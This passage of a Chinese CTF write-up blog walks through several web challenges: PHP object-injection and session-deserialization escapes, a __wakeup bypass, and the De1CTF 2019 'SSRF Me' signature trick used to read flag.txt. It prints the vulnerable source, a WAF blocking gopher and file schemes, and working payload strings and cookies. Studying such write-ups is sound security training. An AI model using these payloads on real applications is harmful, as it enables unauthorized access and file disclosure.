</span></span></span></code></pre></div><p>反序列化之后：</p>
<div class="highlight" id="id-28"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;a:3:{s:4:&#34;</span><span class="nx">user</span><span class="s2">&#34;;s:24:&#34;&#34;;s:8:&#34;</span><span class="nx">function</span><span class="s2">&#34;;s:59:&#34;</span><span class="nx">a</span><span class="s2">&#34;;s:3:&#34;</span><span class="nx">img</span><span class="s2">&#34;;s:20:&#34;</span><span class="nx">ZDBnM19mMWFnLnBocA</span><span class="o">==</span><span class="s2">&#34;;s:2:&#34;</span><span class="nx">dd</span><span class="s2">&#34;;s:1:&#34;</span><span class="nx">a</span><span class="s2">&#34;;}&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;img&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">&#34;Z3Vlc3RfaW1nLnBuZw==&#34;</span><span class="p">;}</span><span class="s2">&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;function&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="s2">&#34;a 其长度为24，作为一个整体成了user的值
</span></span></span><span class="line"><span class="cl"><span class="s2">后面&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="s2">&#34;img&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">&#34;Z3Vlc3RfaW1nLnBuZw==&#34;</span><span class="p">;}</span><span class="s2">&#34;这部分被舍弃
</span></span></span><span class="line"><span class="cl"><span class="s2">这里最后面加上的s:2:&#34;</span><span class="nx">dd</span><span class="s2">&#34;;s:1:&#34;</span><span class="nx">a</span><span class="s2">&#34;是为了满足最前面a:3:中的3
</span></span></span></code></pre></div><p>之后发现在另一个文件里，然后改下名字：</p>
<div class="highlight" id="id-29"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">_SESSION</span><span class="p">[</span><span class="nx">user</span><span class="p">]</span><span class="o">=</span><span class="nx">flagflagflagflagflagflag</span><span class="o">&amp;</span><span class="nx">_SESSION</span><span class="p">[</span><span class="nx">function</span><span class="p">]</span><span class="o">=</span><span class="nx">a</span><span class="s2">&#34;;s:3:&#34;</span><span class="nx">img</span><span class="s2">&#34;;s:20:&#34;</span><span class="nx">L2QwZzNfZmxsbGxsbGFn</span><span class="s2">&#34;;s:2:&#34;</span><span class="nx">dd</span><span class="s2">&#34;;s:1:&#34;</span><span class="nx">a</span><span class="s2">&#34;;}&amp;function=show_image
</span></span></span></code></pre></div><h2 id="0x2d极客大挑战-2019php" class="heading-element">
  <a href="#0x2d%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019php" class="heading-mark"></a>0x2D.[极客大挑战 2019]PHP</h2><blockquote>
<p>考点还是反序列化</p>
</blockquote>
<p>下载备份文件，审计：</p>
<p>class.php</p>
<div class="highlight" id="id-30"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Name</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;nonono&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;yesyes&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You name is: &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">;</span><span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;You password is: &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span><span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s1">&#39;class.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$select</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;select&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="o">@</span><span class="nv">$select</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>当username===&ldquo;admin&quot;时可以拿到flag。</p>
<p>得到：<code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code></p>
<p>反序列化的时候会首先执行<code>__wakeup()</code>魔术方法，所以要跳过<code>__wakeup()</code>去执行<code>__destruct()</code></p>
<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行。</p>
<p>因此：<code>O:4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}</code></p>
<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
<p>因此：<code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></p>
<h2 id="0x2ede1ctf-2019ssrf-me" class="heading-element">
  <a href="#0x2ede1ctf-2019ssrf-me" class="heading-mark"></a>0x2E.[De1CTF 2019]SSRF Me</h2><p>提示说flag在./flag.txt中。</p>
<div class="highlight" id="id-31"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##! /usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1">##encoding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s1">&#39;latin1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secert_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Task</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">action</span> <span class="o">=</span> <span class="n">action</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">param</span> <span class="o">=</span> <span class="n">param</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sign</span> <span class="o">=</span> <span class="n">sign</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">)):</span>          <span class="c1">#SandBox For Remote_Addr</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">Exec</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">checkSign</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;scan&#34;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">tmpfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./</span><span class="si">%s</span><span class="s2">/result.txt&#34;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">resp</span> <span class="o">=</span> <span class="n">scan</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">resp</span> <span class="o">==</span> <span class="s2">&#34;Connection Timeout&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span> <span class="n">resp</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmpfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;read&#34;</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;./</span><span class="si">%s</span><span class="s2">/result.txt&#34;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">sandbox</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;Action Error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">500</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;Sign Error&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">checkSign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">getSign</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">param</span><span class="p">)</span> <span class="o">==</span> <span class="bp">self</span><span class="o">.</span><span class="n">sign</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">##generate Sign For Action Scan.</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/geneSign&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">geneSign</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;param&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="s2">&#34;scan&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/De1ta&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">challenge</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;action&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">param</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;param&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sign</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;sign&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">waf</span><span class="p">(</span><span class="n">param</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No Hacker!!!!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">,</span> <span class="n">sign</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">task</span><span class="o">.</span><span class="n">Exec</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;code.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">socket</span><span class="o">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">param</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">50</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Connection Timeout&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">secert_key</span> <span class="o">+</span> <span class="n">param</span> <span class="o">+</span> <span class="n">action</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">check</span><span class="o">=</span><span class="n">param</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;gopher&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">check</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;file&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span></span></span></code></pre></div><blockquote>
<p>urllib.unquote 是url解码</p>
<p>urlib.urlencode 是url编码</p>
<p>request.args.get获取单个值</p>
</blockquote>
<p>geneSign页面：传param参数然后返回getSign()函数。</p>
<p>De1ta页面：传action和sign两个cookie，还有一个get的param，然后绕waf，waf主要是过滤了两段的空格，转小写，然后不能使用gopher和file两个伪协议，</p>
<div class="highlight" id="id-32"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getSign</span><span class="p">(</span><span class="n">action</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">secert_key</span> <span class="o">+</span> <span class="n">param</span> <span class="o">+</span> <span class="n">action</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span></span></span></code></pre></div><p>需要：<code>secert_key + flag.txtrand + scan</code></p>
<p>构造<code>/geneSign?param=flag.txtread</code>得到cookie：<code>0dd168cd293d52dfc3908caa3847a57d</code></p>
<p>然后访问<code>De1ta</code>页面：</p>
<p><code>Cookie: action=readscan;sign=0dd168cd293d52dfc3908caa3847a57d</code></p>
<p>拿到flag</p>
<h2 id="0x2fciscn-2019-初赛love-math" class="heading-element">
  <a href="#0x2fciscn-2019-%e5%88%9d%e8%b5%9blove-math" class="heading-mark"></a>0x2F.[CISCN 2019 初赛]Love Math</h2><blockquote>
<p>知识点：</p>
<p><strong>PHP函数：</strong></p>
<p>scandir() 函数：返回指定目录中的文件和目录的数组。
base_convert() 函数：在任意进制之间转换数字。
dechex() 函数：把十进制转换为十六进制。
hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。
var_dump() ：函数用于输出变量的相关信息。
readfile() 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。
语法：readfile(filename,include_path,context)</p>
<p><strong>动态函数</strong></p>
<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = &ldquo;sayHello&rdquo;;$function();</p>
<p><strong>php中函数名默认为字符串</strong></p>
<p>例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</p>
</blockquote>
<p>审计</p>
<div class="highlight" id="id-33"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//例子 c=20-1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;太长了不会算&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
